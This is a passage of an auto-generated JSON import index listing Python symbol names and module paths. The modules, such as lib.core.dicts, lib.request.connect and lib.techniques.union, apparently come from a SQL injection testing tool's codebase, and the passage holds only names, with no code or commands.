        "documentation": {}
    },
    {
        "label": "AttribDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "AttribDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "OrderedSet",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "AttribDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "OrderedSet",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "AttribDict",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "OrderedSet",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "OrderedSet",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "OrderedSet",
        "importPath": "lib.core.datatype",
        "description": "lib.core.datatype",
        "isExtraImport": true,
        "detail": "lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "cachedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "cachedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "lockedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "lockedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "importPath": "lib.core.decorators",
        "description": "lib.core.decorators",
        "isExtraImport": true,
        "detail": "lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "FROM_DUMMY_TABLE",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_NULL_EVAL",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DBMS_DICT",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DUMP_DATA_PREPROCESS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "FROM_DUMMY_TABLE",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DBMS_DICT",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DEFAULT_DOC_ROOTS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DEPRECATED_OPTIONS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "OBSOLETE_OPTIONS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "SQL_STATEMENTS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DUMP_REPLACEMENTS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DBMS_DICT",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DUMP_REPLACEMENTS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DBMS_DICT",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DEPRECATED_OPTIONS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "HTML_ENTITIES",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "POST_HINT_CONTENT_TYPES",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "SQL_STATEMENTS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "FROM_DUMMY_TABLE",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "FROM_DUMMY_TABLE",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "FROM_DUMMY_TABLE",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "FROM_DUMMY_TABLE",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "FROM_DUMMY_TABLE",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "PART_RUN_CONTENT_TYPES",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DBMS_DICT",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DUMP_REPLACEMENTS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "SYBASE_TYPES",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "SQL_STATEMENTS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "ALTIBASE_TYPES",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "FIREBIRD_TYPES",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "INFORMIX_TYPES",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DUMP_REPLACEMENTS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DB2_PRIVS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "FIREBIRD_PRIVS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "INFORMIX_PRIVS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "MYSQL_PRIVS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "PGSQL_PRIVS",
        "importPath": "lib.core.dicts",
        "description": "lib.core.dicts",
        "isExtraImport": true,
        "detail": "lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "lib.core.threads",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "setDaemon",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "runThreads",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "runThreads",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "runThreads",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "runThreads",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "runThreads",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadName",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.threads",
        "description": "lib.core.threads",
        "isExtraImport": true,
        "detail": "lib.core.threads",
        "documentation": {}
    },
    {
        "label": "unescaper",
        "importPath": "lib.core.unescaper",
        "description": "lib.core.unescaper",
        "isExtraImport": true,
        "detail": "lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "unescaper",
        "importPath": "lib.core.unescaper",
        "description": "lib.core.unescaper",
        "isExtraImport": true,
        "detail": "lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "unescaper",
        "importPath": "lib.core.unescaper",
        "description": "lib.core.unescaper",
        "isExtraImport": true,
        "detail": "lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "unescaper",
        "importPath": "lib.core.unescaper",
        "description": "lib.core.unescaper",
        "isExtraImport": true,
        "detail": "lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "unescaper",
        "importPath": "lib.core.unescaper",
        "description": "lib.core.unescaper",
        "isExtraImport": true,
        "detail": "lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "unescaper",
        "importPath": "lib.core.unescaper",
        "description": "lib.core.unescaper",
        "isExtraImport": true,
        "detail": "lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "unescaper",
        "importPath": "lib.core.unescaper",
        "description": "lib.core.unescaper",
        "isExtraImport": true,
        "detail": "lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "unescaper",
        "importPath": "lib.core.unescaper",
        "description": "lib.core.unescaper",
        "isExtraImport": true,
        "detail": "lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "unescaper",
        "importPath": "lib.core.unescaper",
        "description": "lib.core.unescaper",
        "isExtraImport": true,
        "detail": "lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "lib.request.connect",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "Connect",
        "importPath": "lib.request.connect",
        "description": "lib.request.connect",
        "isExtraImport": true,
        "detail": "lib.request.connect",
        "documentation": {}
    },
    {
        "label": "comparison",
        "importPath": "lib.request.comparison",
        "description": "lib.request.comparison",
        "isExtraImport": true,
        "detail": "lib.request.comparison",
        "documentation": {}
    },
    {
        "label": "comparison",
        "importPath": "lib.request.comparison",
        "description": "lib.request.comparison",
        "isExtraImport": true,
        "detail": "lib.request.comparison",
        "documentation": {}
    },
    {
        "label": "comparison",
        "importPath": "lib.request.comparison",
        "description": "lib.request.comparison",
        "isExtraImport": true,
        "detail": "lib.request.comparison",
        "documentation": {}
    },
    {
        "label": "checkBooleanExpression",
        "importPath": "lib.request.inject",
        "description": "lib.request.inject",
        "isExtraImport": true,
        "detail": "lib.request.inject",
        "documentation": {}
    },
    {
        "label": "getPageTemplate",
        "importPath": "lib.request.templates",
        "description": "lib.request.templates",
        "isExtraImport": true,
        "detail": "lib.request.templates",
        "documentation": {}
    },
    {
        "label": "getPageTemplate",
        "importPath": "lib.request.templates",
        "description": "lib.request.templates",
        "isExtraImport": true,
        "detail": "lib.request.templates",
        "documentation": {}
    },
    {
        "label": "unionTest",
        "importPath": "lib.techniques.union.test",
        "description": "lib.techniques.union.test",
        "isExtraImport": true,
        "detail": "lib.techniques.union.test",
        "documentation": {}
    },
    {
        "label": "configUnion",
        "importPath": "lib.techniques.union.use",
        "description": "lib.techniques.union.use",
        "isExtraImport": true,
        "detail": "lib.techniques.union.use",
        "documentation": {}
    },
    {
        "label": "unionUse",
        "importPath": "lib.techniques.union.use",
        "description": "lib.techniques.union.use",
        "isExtraImport": true,
        "detail": "lib.techniques.union.use",
        "documentation": {}
    },
    {
        "label": "unionUse",
        "importPath": "lib.techniques.union.use",
        "description": "lib.techniques.union.use",
        "isExtraImport": true,
        "detail": "lib.techniques.union.use",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "six",
        "importPath": "thirdparty",
        "description": "thirdparty",
        "isExtraImport": true,
        "detail": "thirdparty",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "collections_abc",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "configparser",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "input",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "reload_module",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "zip",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "collections_abc",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "collections_abc",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "queue",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "collections_abc",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_cookiejar",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "urllib",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "input",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
        "detail": "thirdparty.six.moves",
        "documentation": {}
    },
    {
        "label": "http_client",
        "importPath": "thirdparty.six.moves",
        "description": "thirdparty.six.moves",
        "isExtraImport": true,
